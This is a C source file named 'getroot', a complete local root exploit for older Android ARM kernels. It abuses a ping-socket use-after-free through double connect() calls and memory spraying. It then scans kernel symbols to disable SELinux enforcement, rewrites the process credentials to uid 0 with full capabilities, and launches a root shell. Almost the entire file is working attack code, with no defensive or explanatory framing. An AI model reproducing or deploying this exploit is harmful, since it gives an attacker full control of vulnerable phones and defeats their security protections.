/* getroot 2015/09/26 */

/*
 * Copyright (C) 2015 CUBE
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 */

#define EXECCOMMAND "/system/bin/sh"

#include <stdio.h>
#include <stdbool.h>
#include <stdlib.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <linux/in.h>
#include <linux/init.h>
#include <unistd.h>
#include <errno.h>
#include <sys/wait.h>
#include <sys/sysinfo.h>
#include <sys/system_properties.h>

#define THREAD_SIZE 8192
#define KERNEL_START 0xc0000000
#define KALLSYMS_SEARCH_START 0xc0008000
#define KERNEL_SIZE 0x01000000

#define MAX_MMAPS 1024
#define MMAP_ADDRESS(x) (0x10000000 + (x) * MMAP_SIZE)
#define MMAP_BASE(x) (((unsigned)(x)) & ~(MMAP_SIZE - 1))
#define MMAP_SIZE (16 * 1024 * 1024)
#define TIMESTAMP_MAGIC 0x0deadbad
#define ADDR_ADD(p,n) ((void *)((char *)(p) + (n)))
#define OFFSET_SK_PROT 0x24
#define OFFSET_SK_STAMP 0x148
#define OFFSET_MC_LIST 0x1c4

#ifndef SIOCGSTAMPNS
#define SIOCGSTAMPNS 0x8907
#endif /* SIOCGSTAMPNS */

#define NSEC_PER_SEC 1000000000
#define LIST_POISON2 0x00200200
#define ARRAY_SIZE(x) (sizeof (x) / sizeof (*(x)))

struct task_struct;
struct thread_info {
	unsigned long flags;
	int preempt_count;
	unsigned long addr_limit;
	struct task_struct *task;
	/* ... */
};
struct kernel_cap_struct {
	unsigned long cap[2];
};
struct cred {
	unsigned long usage;
	uid_t uid;
	gid_t gid;
	uid_t suid;
	gid_t sgid;
	uid_t euid;
	gid_t egid;
	uid_t fsuid;
	gid_t fsgid;
	unsigned long securebits;
	struct kernel_cap_struct cap_inheritable;
	struct kernel_cap_struct cap_permitted;
	struct kernel_cap_struct cap_effective;
	struct kernel_cap_struct cap_bset;
	unsigned char jit_keyring;
	void *thread_keyring;
	void *request_key_auth;
	void *tgcred;
	struct task_security_struct *security;
	/* ... */
};
struct list_head {
	struct list_head *next;
	struct list_head *prev;
};
struct task_security_struct {
	unsigned long osid;
	unsigned long sid;
	unsigned long exec_sid;
	unsigned long create_sid;
	unsigned long keycreate_sid;
	unsigned long sockcreate_sid;
};
struct task_struct_partial {
	/* ... */
	struct list_head cpu_timers[3];
	struct cred *real_cred;
	struct cred *cred;
	struct cred *replacement_session_keyring;
	char comm[16];
	/* ... */
};

static const unsigned long pattern_kallsyms_addresses[] = {
	0xc0008000,	/* stext */
	0xc0008000,	/* _sinittext */
	0xc0008000,	/* _stext */
	0xc0008000	/* __init_begin */
};
static const unsigned long pattern_kallsyms_addresses2[] = {
	0xc0008000,	/* stext */
	0xc0008000	/* _text */
};
static const unsigned long pattern_kallsyms_addresses3[] = {
	0xc00081c0,	/* asm_do_IRQ */
	0xc00081c0,	/* _stext */
	0xc00081c0	/* __exception_text_start */
};
static const unsigned long pattern_kallsyms_addresses4[] = {
	0xc0100000,	/* asm_do_IRQ */
	0xc0100000,	/* _stext */
	0xc0100000	/* __exception_text_start */
};
static const unsigned long pattern_kallsyms_addresses5[] = {
	0x00000000,	/* __vectors_start */
	0xc0100000,	/* asm_do_IRQ */
	0xc0100000,	/* _stext */
	0xc0100000	/* __exception_text_start */
};

static unsigned long kallsyms_num_syms;
static unsigned long *kallsyms_addresses;
static unsigned char *kallsyms_names;
static unsigned char *kallsyms_token_table;
static unsigned short *kallsyms_token_index;
static unsigned long *kallsyms_markers;

int __init (*enforcing_setup)(char *str);


static inline struct thread_info *current_thread_info(void) {
	register unsigned long sp asm ("sp");
	return (struct thread_info *)(sp & ~(THREAD_SIZE - 1));
}

static bool is_cpu_timer_valid(struct list_head *cpu_timer) {
	if (cpu_timer->next != cpu_timer->prev) {
		return false;
	}

	if ((unsigned long int)cpu_timer->next < KERNEL_START) {
		return false;
	}

	return true;
}

static unsigned long *search_pattern(unsigned long *base, unsigned long count, const unsigned long *pattern, int patternlen) {
	unsigned long *addr;
	unsigned long i, j, matchcnt;

	addr = base;
	for (i = 0; i < (count - patternlen); i++) {
		matchcnt = 0;
		for (j = 0; j < patternlen; j++) {
			if (addr[i + j] != pattern[j]) {
				break;
			}
			matchcnt++;
		}
		if (matchcnt == patternlen) {
			return &addr[i];
		}
	}

	return NULL;
}

static bool get_kallsyms_addresses(unsigned long *mem, unsigned long len) {
	unsigned long *addr;
	unsigned long *endaddr;
	unsigned long n;
	unsigned long i;
	unsigned long off;

	addr = mem;
	endaddr = (unsigned long *)((unsigned long)mem + len);
	while (addr < endaddr) {
		/* get kallsyms_addresses pointer */
		kallsyms_addresses = search_pattern(addr, endaddr - addr, pattern_kallsyms_addresses, sizeof(pattern_kallsyms_addresses) / sizeof(unsigned long));
		if (kallsyms_addresses == NULL) {
			kallsyms_addresses = search_pattern(addr, endaddr - addr, pattern_kallsyms_addresses2, sizeof(pattern_kallsyms_addresses2) / sizeof(unsigned long));
			if (kallsyms_addresses == NULL) {
				kallsyms_addresses = search_pattern(addr, endaddr - addr, pattern_kallsyms_addresses3, sizeof(pattern_kallsyms_addresses3) / sizeof(unsigned long));
				if (kallsyms_addresses == NULL) {
					kallsyms_addresses = search_pattern(addr, endaddr - addr, pattern_kallsyms_addresses4, sizeof(pattern_kallsyms_addresses4) / sizeof(unsigned long));
					if (kallsyms_addresses == NULL) {
						kallsyms_addresses = search_pattern(addr, endaddr - addr, pattern_kallsyms_addresses5, sizeof(pattern_kallsyms_addresses5) / sizeof(unsigned long));
						if (kallsyms_addresses == NULL) {
							return false;
						}
					}
				}
			}
		}

		addr = kallsyms_addresses;

		/* search end of kallsyms_addresses */
		n = 0;
		n++;
		addr++;
		while (addr[0] > 0xc0000000) {
			n++;
			addr++;
			if (addr >= endaddr) {
				return false;
			}
		}

		/* skip there is filled by 0x0 */
		while (addr[0] == 0x00000000) {
			addr++;
			if (addr >= endaddr) {
				return false;
			}
		}

		kallsyms_num_syms = addr[0];
		addr++;
		if (addr >= endaddr) {
			return false;
		}

		/* check kallsyms_num_syms */
		if (kallsyms_num_syms != n) {
			continue;
		}

		/* skip there is filled by 0x0 */
		while (addr[0] == 0x00000000) {
			addr++;
			if (addr >= endaddr) {
				return false;
			}
		}

		kallsyms_names = (unsigned char *)addr;

		/* search end of kallsyms_names */
		for (i = 0, off = 0; i < kallsyms_num_syms; i++) {
			int len = kallsyms_names[off];
			off += len + 1;
			if (&kallsyms_names[off] >= (unsigned char *)endaddr) {
				return false;
			}
		}

		/* adjust */
		addr = (unsigned long *)((((unsigned long)&kallsyms_names[off] - 1) | 0x3) + 1);
		if (addr >= endaddr) {
			return false;
		}

		/* skip there is filled by 0x0 */
		while (addr[0] == 0x00000000) {
			addr++;
			if (addr >= endaddr) {
				return false;
			}
		}
		/* but kallsyms_markers shoud be start 0x00000000 */
		addr--;

		kallsyms_markers = addr;

		/* end of kallsyms_markers */
		addr = &kallsyms_markers[((kallsyms_num_syms - 1) >> 8) + 1];
		if (addr >= endaddr) {
			return false;
		}

		/* skip there is filled by 0x0 */
		while (addr[0] == 0x00000000) {
			addr++;
			if (addr >= endaddr) {
				return false;
			}
		}

		kallsyms_token_table = (unsigned char *)addr;

		i = 0;
		while ((kallsyms_token_table[i] != 0x00) || (kallsyms_token_table[i + 1] != 0x00)) {
			i++;
			if (&kallsyms_token_table[i - 1] >= (unsigned char *)endaddr) {
				return false;
			}
		}

		/* skip there is filled by 0x0 */
		while (kallsyms_token_table[i] == 0x00) {
			i++;
			if (&kallsyms_token_table[i - 1] >= (unsigned char *)endaddr) {
				return false;
			}
		}

		/* but kallsyms_token_index shoud be start 0x0000 */
		kallsyms_token_index = (unsigned short *)&kallsyms_token_table[i - 2];

		return true;
	}

	return false;
}

static unsigned long kallsyms_expand_symbol(unsigned long off, char *namebuf) {
	int len;
	bool skipped_first;
	const unsigned char *tptr;
	const unsigned char *data;

	/* Get the compressed symbol length from the first symbol byte. */
	data = &kallsyms_names[off];
	len = *data;
	off += len + 1;
	data++;

	skipped_first = false;
	while (len > 0) {
		tptr = &kallsyms_token_table[kallsyms_token_index[*data]];
		data++;
		len--;

		while (*tptr > 0) {
			if (skipped_first) {
				*namebuf = *tptr;
				namebuf++;
			} else {
				skipped_first = true;
			}
			tptr++;
		}
	}
	*namebuf = '\0';

	return off;
}

static bool cmpname(char *name1, char *name2) {
	int i;

	for (i = 0; i < 1024; i++) {
		if (name1[i] == '\0') {
			return true;
		}
		if (name1[i] != name2[i]) {
			return false;
		}
	}

	return false;
}

static bool search_function() {
	char namebuf[1024];
	unsigned long i;
	unsigned long off;

	for (i = 0, off = 0; i < kallsyms_num_syms; i++) {
		off = kallsyms_expand_symbol(off, namebuf);
		if (cmpname(namebuf, "enforcing_setup")) {
			enforcing_setup = (void *)(kallsyms_addresses[i]);
			return true;
		}
	}

	return false;
}

void obtain_root_privilege_by_modify_task_cred(void) {
	struct thread_info *info;
	struct cred *cred;
	struct task_security_struct *security;
	int i;
	bool ret;

	ret = get_kallsyms_addresses((void *)KALLSYMS_SEARCH_START, KERNEL_SIZE);
	if (ret) {
		ret = search_function();
		if (ret) {
			enforcing_setup("0");
		}
	}

	info = current_thread_info();
	info->addr_limit = -1;

	cred = NULL;

	for (i = 0; i < 0x400; i += 4) {
		struct task_struct_partial *task = ((void *)info->task) + i;

		if (is_cpu_timer_valid(&task->cpu_timers[0])
			&& is_cpu_timer_valid(&task->cpu_timers[1])
			&& is_cpu_timer_valid(&task->cpu_timers[2])
			&& task->real_cred == task->cred) {
			cred = task->cred;
			break;
		}
	}

	if (cred == NULL) {
		return;
	}

	cred->uid = 0;
	cred->gid = 0;
	cred->suid = 0;
	cred->sgid = 0;
	cred->euid = 0;
	cred->egid = 0;
	cred->fsuid = 0;
	cred->fsgid = 0;

	cred->cap_inheritable.cap[0] = 0;
	cred->cap_inheritable.cap[1] = 0;
	cred->cap_permitted.cap[0] = 0xffffffff;
	cred->cap_permitted.cap[1] = 0xffffffff;
	cred->cap_effective.cap[0] = 0xffffffff;
	cred->cap_effective.cap[1] = 0xffffffff;
	cred->cap_bset.cap[0] = 0xffffffff;
	cred->cap_bset.cap[1] = 0xffffffff;

	security = cred->security;
	if (security) {
		if (security->osid != 0
			&& security->sid != 0
			&& security->exec_sid == 0
			&& security->create_sid == 0
			&& security->keycreate_sid == 0
			&& security->sockcreate_sid == 0) {
			security->osid = 1;
			security->sid = 1;
		}
	}
}

static size_t get_page_size(void) {
	static size_t pagesize;

	if (pagesize == 0) {
		pagesize = sysconf(_SC_PAGESIZE);
	}

	return pagesize;
}

static int maximize_fd_limit(void) {
	struct rlimit rlim;
	int ret;

	ret = getrlimit(RLIMIT_NOFILE, &rlim);
	if (ret != 0) {
		return -1;
	}

	rlim.rlim_cur = rlim.rlim_max;
	setrlimit(RLIMIT_NOFILE, &rlim);

	ret = getrlimit(RLIMIT_NOFILE, &rlim);
	if (ret != 0) {
		return -1;
	}

	return rlim.rlim_cur;
}

static int setup_vul_socket(int sock) {
	struct sockaddr_in sa;
	int ret;

	memset(&sa, 0, sizeof sa);
	sa.sin_family = AF_UNSPEC;

	ret = connect(sock, (struct sockaddr *)&sa, sizeof sa);
	if (ret != 0) {
		printf("connect(%d) #1: ret = %d\n", sock, ret);
		return -1;
	}

	ret = connect(sock, (struct sockaddr *)&sa, sizeof sa);
	if (ret != 0) {
		printf("connect%d() #2: ret = %d\n", sock, ret);
		return -1;
	}

	return 0;
}

static int create_icmp_socket(void) {
	struct sockaddr_in sa;
	int sock;
	int ret;

	memset(&sa, 0, sizeof sa);
	sa.sin_family = AF_INET;

	sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_ICMP);
	if (sock == -1) {
		return -1;
	}

	ret = connect(sock, (struct sockaddr *)&sa, sizeof sa);
	if (ret != 0) {
		int result;

		result = errno;
		close(sock);
		errno = result;

		return -1;
	}

	return sock;
}

static int close_icmp_socket(int sock) {
	return close(sock);
}

int *create_vul_sockets(void) {
	int max_fds;
	int *socks;
	int num_socks;
	int i;

	max_fds = maximize_fd_limit();
	printf("max_fds=%d\n", max_fds); 

	printf("Creating target socket..."); 
	fflush(stdout);

	socks = malloc((max_fds + 1) * sizeof (*socks));
	if (!socks) {
		printf("\nNo memory.\n");
		return NULL;
	}

	num_socks = 0;
	for (i = 0; i < 3072; i++) {
		if (num_socks < max_fds) {
			socks[num_socks] = create_icmp_socket();
			if (socks[num_socks] == -1) {
				break;
			}
			num_socks++;
		}
	}

	printf("OK.\n");
	printf("%d sockets created.\n", num_socks);

	if (num_socks < 1) {
		printf("No icmp socket available.\n");
		free(socks);
		return NULL;
	}

	socks[num_socks] = -1;

	for (i = 0; i < num_socks - 1; i++) {
		setup_vul_socket(socks[i]);
	}

	return socks;
}

static int lock_page_in_memory(void *address, size_t size) {
	int ret;

	ret = mlock(address, size);
	if (ret != 0) {
		return -1;
	}

	return 0;
}

static void populate_pagetable_for_address(void *address) {
	*(void **)address = NULL;
}

static void *protect_crash_when_double_free(void) {
	void *address;
	size_t pagesize;

	pagesize = get_page_size();
	address = (void *)((LIST_POISON2 / pagesize) * pagesize);
	address =  mmap(address, pagesize, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);

	if (address == MAP_FAILED) {
		return NULL;
	}

	populate_pagetable_for_address(address);
	lock_page_in_memory(address, pagesize);

	return address;
}

static int free_protect(void *protect) {
	size_t pagesize;

	pagesize = get_page_size();
	return munmap(protect, pagesize);
}

static void fill_with_payload(void *address, size_t size) {
	unsigned *p = address;
	int i;

	for (i = 0; i < size; i += sizeof (*p) * 2) {
		*p++ = (unsigned)p;
		*p++ = TIMESTAMP_MAGIC;
	}
}

static int get_sk_from_timestamp(int sock) {
	struct timespec tv;
	uint64_t value;
	unsigned high;
	unsigned low;
	int ret;

	ret = ioctl(sock, SIOCGSTAMPNS, &tv);
	if (ret != 0) {
		return -1;
	}

	value = ((uint64_t)tv.tv_sec * NSEC_PER_SEC) + tv.tv_nsec;
	high = (unsigned)(value >> 32);
	low = (unsigned)value;

	if (high == TIMESTAMP_MAGIC) {
		return low - OFFSET_SK_STAMP;
	}

	return 0;
}

static int try_control_sk(int *socks) {
	static void *address[MAX_MMAPS];
	int success;
	int count;
	int i;
	int ret;

	success = 0;
	count = 0;
	for (i = 0; i < MAX_MMAPS; i++) {
		int j;

		address[i] =  mmap((void *)MMAP_ADDRESS(i), MMAP_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);

		if (address[i] == MAP_FAILED) {
			printf("mmap(): failed: %s (%d)\n", strerror(errno), errno);
			break;
		}

		count++;

		lock_page_in_memory(address[i], MMAP_SIZE);
		fill_with_payload(address[i], MMAP_SIZE);

		for (j = 0; socks[j] != -1; j++) {
			ret = get_sk_from_timestamp(socks[j]);
			if (ret > 0) {
				success = 1;
				address[i] = 0;
			}
		}

		if (success) {
			break;
		}
	}

	printf("%08x bytes allocated.\n", (unsigned int)(count * MMAP_SIZE));

	for (i = 0; i < count; i++) {
		if (address[i]) {
			munmap(address[i], MMAP_SIZE);
		}
	}

	if (success) {
		return 0;
	}

	return -1;
}

static int setup_get_root(void *sk) {
	static unsigned prot[256];
	unsigned *mmap_end_address;
	unsigned *p;
	int i;

	for (i = 0; i < ARRAY_SIZE(prot); i++) {
		prot[i] = (unsigned)obtain_root_privilege_by_modify_task_cred;
	}

	mmap_end_address = (void *)MMAP_BASE(sk) + MMAP_SIZE - 1;

	for (i = OFFSET_MC_LIST - 32; i < OFFSET_MC_LIST + 32; i+= 4) {
		p = ADDR_ADD(sk, i);
		if (p > mmap_end_address) {
			break;
		}

		*p = 0;
	}

	for (i = OFFSET_SK_PROT - 32; i < OFFSET_SK_PROT + 32; i+= 4) {
		p = ADDR_ADD(sk, i);
		if (p > mmap_end_address) {
			break;
		}
		*p = (unsigned)prot;
	}
}

static void keep_invalid_sk(void) {
	pid_t pid;

	printf("\n");
	printf("There are some invalid sockets.\n");
	printf("Please reboot now to avoid crash...\n");

	pid = fork();
	if (pid == -1 || pid == 0) {
		close(0);
		close(1);
		close(2);

		while (1) {
			sleep(60);
		}
	}
}

static int do_get_root(int *socks) {
	int ret;
	int i;

	for (i = 0; socks[i] != -1; i++) {
		void *sk;

		ret = get_sk_from_timestamp(socks[i]);
		if (ret <= 0) {
			if (ret == 0) {
				printf("-");
			} else {
				printf("x");
			}
			fflush(stdout);
			continue;
		}

		sk = (void *)ret;
		//printf("sk=%08x\n", (unsigned int)sk);
		printf("o");
		fflush(stdout);
		setup_get_root(sk);
		sleep(1);

		close_icmp_socket(socks[i]);
		break;
	}
	printf("\n");
}

int run_exploit() {
	int *socks;
	int ret;

	socks = create_vul_sockets();
	if (socks == NULL) {
		return 1;
	}

	while (1) {
		ret = try_control_sk(socks);
		if (ret == 0) {
			printf("Done!\n");
			break;
		}
	}

	do_get_root(socks);

	return 0;
}

int main(int argc, char **argv) {
	char devicename[PROP_VALUE_MAX];
	char buildid[PROP_VALUE_MAX];
	char versionrelease[PROP_VALUE_MAX];

	void *protect = NULL;
	int ret;

	__system_property_get("ro.build.product", devicename);
	__system_property_get("ro.build.id", buildid);
	__system_property_get("ro.build.version.release", versionrelease);
	printf("ro.build.product=%s\n", devicename);
	printf("ro.build.id=%s\n", buildid);
	printf("ro.build.version.release=%s\n", versionrelease);

	protect = protect_crash_when_double_free();
	if (!protect) {
		printf("Error in protect_crash_when_double_free()\n");
		return 1;
	}

	run_exploit();

	if (getuid() != 0) {
		printf("Failed to getroot.\n");
	} else {
		printf("Succeeded in getroot!\n");
		printf("\n");

		if (argc >= 2) {
			system(argv[1]);
		} else {
			system(EXECCOMMAND);
		}
	}

	keep_invalid_sk();

	if (protect) {
		ret = free_protect(protect);
		if (ret != 0) {
			printf("Error in free_protect()\n");
			return -1;
		}
	}

	exit(EXIT_SUCCESS);
	return 0;
}
